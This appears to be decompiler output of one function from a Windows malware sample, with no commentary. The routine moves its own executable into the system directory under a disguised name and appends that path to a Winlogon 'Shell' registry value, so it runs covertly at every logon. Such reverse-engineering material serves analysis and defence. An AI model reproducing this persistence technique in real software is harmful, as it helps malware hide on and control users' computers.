
HKEY __cdecl FUN_10001bb8(HKEY param_1)

{
  LPSTR _Str;
  size_t sVar1;
  char *pcVar2;
  BOOL BVar3;
  HKEY pHVar4;
  LSTATUS LVar5;
  size_t sVar6;
  int iVar7;
  undefined4 *puVar8;
  CHAR *pCVar9;
  BYTE local_568;
  undefined4 local_567;
  undefined auStack_4a0 [568];
  char local_268;
  undefined4 local_267;
  CHAR local_168 [56];
  CHAR local_130;
  undefined4 local_12f;
  DWORD local_10;
  DWORD local_c;
  HKEY local_8;
  
  local_568 = '\0';
  local_130 = '\0';
  puVar8 = &local_567;
  for (iVar7 = 0xbf; iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  local_268 = '\0';
  *(undefined2 *)puVar8 = 0;
  pHVar4 = (HKEY)0x1;
  *(undefined *)((int)puVar8 + 2) = 0;
  puVar8 = &local_12f;
  for (iVar7 = 0x47; iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined2 *)puVar8 = 0;
  *(undefined *)((int)puVar8 + 2) = 0;
  puVar8 = &local_267;
  for (iVar7 = 0x3f; iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined2 *)puVar8 = 0;
  *(undefined *)((int)puVar8 + 2) = 0;
  local_c = 1;
  pcVar2 = s_Software_Microsoft_Windows_NT_Cu_100060e4;
  pCVar9 = local_168;
  for (iVar7 = 0xd; iVar7 != 0; iVar7 = iVar7 + -1) {
    *(undefined4 *)pCVar9 = *(undefined4 *)pcVar2;
    pcVar2 = pcVar2 + 4;
    pCVar9 = pCVar9 + 4;
  }
  local_10 = 0x300;
  *(undefined2 *)pCVar9 = *(undefined2 *)pcVar2;
  _Str = GetCommandLineA();
  if ((_Str != (LPSTR)0x0) && (sVar1 = strlen(_Str), sVar1 < 0xff)) {
    if (*_Str == '\"') {
      _Str = _Str + 1;
      sVar1 = sVar1 - 1;
    }
    memcpy(&local_268,_Str,sVar1);
    pcVar2 = strrchr(&local_268,0x22);
    if (pcVar2 != (char *)0x0) {
      *pcVar2 = '\0';
    }
    pcVar2 = strrchr(&local_268,0x5c);
    if (pcVar2 == (char *)0x0) {
      pcVar2 = &local_268;
    }
    else {
      pcVar2 = pcVar2 + 1;
    }
    if ((param_1 == (HKEY)0x80000002) || (param_1 != (HKEY)0x80000001)) {
      GetEnvironmentVariableA(s_SYSTEMROOT_100060d0,&local_130,0x120);
      strcat(&local_130,s__System32_100060c4);
    }
    else {
      GetEnvironmentVariableA(&DAT_100060dc,&local_130,0x120);
    }
    strcat(&local_130,&DAT_100060c0);
    strcat(&local_130,&DAT_100060bc);
    strcat(&local_130,&DAT_100060b8);
    strcat(&local_130,s_32_exe_100060b0);
    pcVar2 = strstr(pcVar2,&DAT_100060a8);
    if (pcVar2 == (char *)0x0) {
      strcat(&local_268,&DAT_100060a8);
    }
    BVar3 = MoveFileA(&local_268,&local_130);
    if (BVar3 != 0) {
      sVar1 = strlen(&local_130);
      pHVar4 = (HKEY)RegOpenKeyExA(param_1,local_168,0,0xf003f,&local_8);
      if (pHVar4 == (HKEY)0x0) {
        LVar5 = RegQueryValueExA(local_8,s_Shell_100060a0,(LPDWORD)0x0,&local_c,&local_568,&local_10
                                );
        if (LVar5 != 0) {
          strcpy((char *)&local_568,s_Explorer_exe_10006090);
          local_c = 1;
        }
        sVar6 = strlen((char *)&local_568);
        if (sVar6 < 0xf) {
          sVar6 = strlen((char *)&local_568);
          memset(&local_568 + sVar6,0x20,(size_t)(&local_268 + -(int)(&local_568 + sVar6)));
          memcpy(auStack_4a0 + sVar6,&local_130,sVar1);
          auStack_4a0[sVar1 + sVar6] = 0;
          local_10 = strlen((char *)&local_568);
          pHVar4 = (HKEY)RegSetValueExA(local_8,s_Shell_100060a0,0,local_c,&local_568,local_10);
          if (pHVar4 == (HKEY)0x0) {
            pHVar4 = param_1;
          }
          RegCloseKey(local_8);
        }
        else {
          pHVar4 = (HKEY)0x1;
        }
      }
    }
  }
  return pHVar4;
}

